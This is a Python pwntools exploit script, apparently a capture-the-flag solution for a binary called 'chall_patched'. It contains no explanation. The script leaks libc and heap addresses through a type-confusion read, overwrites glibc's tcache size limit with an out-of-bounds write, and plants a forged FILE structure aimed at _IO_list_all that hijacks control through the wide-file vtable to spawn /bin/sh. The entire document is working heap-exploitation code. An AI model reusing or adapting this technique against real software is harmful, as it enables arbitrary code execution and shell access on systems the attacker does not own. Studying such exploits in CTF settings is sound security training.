#!/usr/bin/env python3

from pwn import *
import struct

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

real = b"x"
string = b"0"

def GDB():
    gdb.attach(p,gdbscript='''
    c
    ''')
    input()



if args.REMOTE:
    p = remote("0.0.0.0", 9007)
else:
    p = process([exe.path])
    GDB()

def create(size):
    p.sendlineafter(b"> ",b"1") 
    p.sendlineafter(b"size: ",f"{size}".encode())

def set_items(index,types,value):
    p.sendlineafter(b"> ",b"2") 
    p.sendlineafter(b"index: ",f"{index}".encode())
    p.sendlineafter(b"type [0=str / x=real]: ",types)
    p.sendlineafter(b"value: ",value)

def get_items(index):
    p.sendlineafter(b"> ",b"3") 
    p.sendlineafter(b"index: ",f"{index}".encode())




create(66)
set_items(0,string,b"A"*0x410)
create(2)
get_items(0)
libc.address =  int(struct.pack('>d',float(p.recvline()[:-1]) ).hex(),16) - 0x21b0d0
log.info('[+]LIBC BASE:'+hex(libc.address))
get_items(1)
heap = int(struct.pack('>d',float(p.recvline()[:-1])).hex(),16) - 0x310
log.info('[+]HEAP BASE:'+hex(heap))
mp_tcache_size = libc.address + 0x21a3c0
storage = heap + 0x320

offset = (mp_tcache_size - storage)//16
print(offset)
p.sendlineafter(b"> ",b"2") 
p.sendlineafter(b"index: ",f"{offset}".encode())
p.sendlineafter(b"type [0=str / x=real]: ",string)


payload  = str(0x458 // 0x10).encode()
payload += b'\x00' * (0x10-len(payload))
payload += p64((libc.address + 0x21b680))  # _IO_list_all
p.sendlineafter("> ", "1")
p.sendlineafter(": ", payload)




fake_file = flat(
    0x3b01010101010101, u64(b"/bin/sh\0"), # flags / rptr
    0, 0, # rend / rbase
    0, 1, # wbase / wptr
    0, 0, # wend / bbase
    0, 0, # bend / savebase
    0, 0, # backupbase / saveend
    0, 0, # marker / chain
)
fake_file += p64(libc.address + 0x50d70) # __doallocate
fake_file += b'\x00' * (0x88 - len(fake_file))
fake_file += p64(heap) # lock
fake_file += b'\x00' * (0xa0 - len(fake_file))
fake_file += p64(heap + 0x350) # wide_data
fake_file += b'\x00' * (0xd8 - len(fake_file))
fake_file += p64(libc.address + 0x2170c0) # vtable (_IO_wfile_jumps)1
fake_file += p64(heap + 0x358) # _wide_data->_wide_vtable
# assert is_gets_safe(fake_file)
set_items(0, string, fake_file)

p.interactive()
